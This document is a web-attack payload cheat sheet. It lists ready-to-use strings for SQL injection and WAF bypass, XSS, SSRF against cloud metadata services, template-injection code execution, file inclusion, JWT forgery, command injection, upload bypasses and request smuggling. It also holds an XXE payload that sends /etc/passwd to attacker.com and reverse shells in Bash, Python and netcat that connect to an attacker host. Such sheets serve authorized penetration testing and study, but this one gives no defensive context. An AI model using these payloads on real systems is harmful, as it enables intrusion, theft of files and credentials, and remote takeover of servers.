# Payload Cheatsheet — Quick Reference

## SQL Injection

### Detection
```
' OR 1=1--
" OR 1=1--
' OR '1'='1
1' ORDER BY 1--
1' UNION SELECT NULL--
' AND SLEEP(5)--
```

### Data Extraction
```
MySQL:      ' UNION SELECT database(),version()--
PostgreSQL: ' UNION SELECT current_database(),version()--
MSSQL:      ' UNION SELECT DB_NAME(),@@version--
```

### WAF Bypass
```
UN/**/ION SEL/**/ECT 1,2,3--
/*!50000UNION*//*!50000SELECT*/1,2,3--
%55NION %53ELECT 1,2,3--
```

## XSS

### Basic
```
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
" onmouseover=alert(1) "
';alert(1);//
```

### WAF Bypass
```
<ScRiPt>alert(1)</ScRiPt>
<img src=x onerror=alert`1`>
<details open ontoggle=alert(1)>
${alert(1)}
```

## SSRF

### Basic
```
http://127.0.0.1
http://localhost
http://0.0.0.0
http://[::1]
```

### Cloud Metadata
```
AWS:   http://169.254.169.254/latest/meta-data/
GCP:   http://metadata.google.internal/computeMetadata/v1/
Azure: http://169.254.169.254/metadata/instance?api-version=2021-02-01
```

### Bypass
```
http://0177.0.0.1          # Octal
http://0x7f000001          # Hex
http://2130706433          # Decimal
http://127.0.0.1.nip.io   # DNS
```

## SSTI

### Detection
```
{{7*7}}    → 49 (Jinja2/Twig)
${7*7}     → 49 (Freemarker/Mako)
<%= 7*7 %> → 49 (ERB)
#{7*7}     → 49 (Ruby Slim)
```

### RCE
```
Jinja2:    {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
Twig:      {{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}
Freemarker: <#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}
```

## LFI

### Basic
```
../../../../etc/passwd
..\..\..\..\windows\win.ini
```

### PHP Wrappers
```
php://filter/convert.base64-encode/resource=/etc/passwd
php://filter/convert.base64-encode/resource=index.php
data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpPz4=
```

## JWT

### Attacks
```
alg:none: Remove signature, set alg to "none"
Weak secret: hashcat -m 16500 jwt.txt wordlist.txt
Claim manipulation: Change role to admin
kid injection: {"kid":"../../../../dev/null","alg":"HS256"}
```

## Command Injection

### Basic
```
; id
| id
|| id
&& id
`id`
$(id)
```

### Bypass
```
{cat,/etc/passwd}              # Space bypass
c'a't /etc/passwd              # Quote bypass
cat /etc/p?sswd                # Wildcard
echo L2V0Yy9wYXNzd2Q= | base64 -d | xargs cat  # Base64
```

## File Upload

### Bypass
```
.php.jpg                       # Double extension
.php%00.jpg                    # Null byte
.php;.jpg                      # IIS semicolon
GIF89a;<?php system('id');?>   # Magic bytes
Content-Type: image/jpeg       # MIME type spoofing
```

## XXE

### File Read
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>
```

### Blind OOB
```xml
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?x=%file;'>">
%eval;
%exfil;
]>
```

## HTTP Smuggling

### CL.TE
```
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

### TE.CL
```
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0
```

## Reverse Shells

### Bash
```bash
bash -i >& /dev/tcp/attacker/4444 0>&1
```

### Python
```python
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("attacker",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
```

### Netcat
```bash
nc -e /bin/sh attacker 4444
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc attacker 4444 >/tmp/f
```
